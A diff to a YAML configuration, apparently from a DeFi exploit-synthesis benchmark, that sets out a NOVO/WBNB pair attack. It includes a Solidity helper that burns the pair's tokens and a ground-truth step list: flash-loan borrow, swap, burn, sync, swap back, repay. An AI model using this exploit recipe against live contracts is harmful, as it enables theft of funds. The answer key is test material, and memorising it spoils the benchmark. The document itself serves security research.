@@ -16,8 +16,9 @@ ctrt_name2deploy:
   - ["router", ""]
 
 extra_actions:
-  - "function burn_pair_novo(uint256 amount) internal {
+  - "function burn_novo_pair(uint256 amount) internal eurus {
       novo.transferFrom(address(pair), address(novo), amount);
+      pair.sync();
     }"
 
 extra_deployments:
@@ -27,12 +28,11 @@ extra_statements: []
 attack_goal_str: "wbnb"
 
 groundtruth:
-  - ["borrow", "owner", "wbnb", "17e18"]
-  - ["swap", "pair", "wbnb", "novo", "wbnb.balanceOf(attacker)"]
-  - ["burn", "pair", "novo", "0.113951614e18"]
-  - ["sync", "pair"]
-  - ["swap", "pair", "novo", "wbnb", "novo.balanceOf(attacker)"]
-  - ["payback", "owner", "wbnb", "17e18 * 1003 / 1000"]
+  - ["borrow", "wbnb", "owner", "17e18"]
+  - ["swap", "pair", "attacker", "wbnb", "novo", "wbnb.balanceOf(attacker)", "pair.getAmountOut(wbnb.balanceOf(attacker), address(wbnb))"]
+  - ["burn", "novo", "pair", "0.113951614e18"]
+  - ["swap", "pair", "attacker", "novo", "wbnb", "novo.balanceOf(attacker)", "pair.getAmountOut(novo.balanceOf(attacker), address(novo))"]
+  - ["payback", "wbnb", "owner", "17e18 * 1003 / 1000"]
 
 # Information for search space building.
 roles:
@@ -47,7 +47,8 @@ roles:
     is_burnable: true
   "pair":
     is_swappair: true
-    uniswap_order: ["novo", "wbnb"]
+    is_uniswap: true
+    token_pair: ["novo", "wbnb"]
     support_swaps:
       "wbnb": ["novo", "wbnb"]
       "novo": ["novo", "wbnb"]
